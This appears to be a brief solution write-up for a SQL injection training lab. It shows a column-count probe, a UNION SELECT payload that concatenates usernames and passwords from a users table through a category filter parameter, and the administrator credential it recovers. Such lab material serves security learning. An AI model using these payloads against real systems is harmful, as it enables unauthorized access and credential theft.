# Lab: SQL injection UNION attack, retrieving multiple values in a single column

Target : Perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

Analysis:

- `Corporate+gifts'+order+by+2+--`
  - 2 columns the second one is the string column
-`/filter?category=Corporate+gifts'+UNION+SELECT+NULL,CONCAT(username,'+->+',password)+FROM+users+--`
-`administrator:avv65lc55npmaik0koq8`
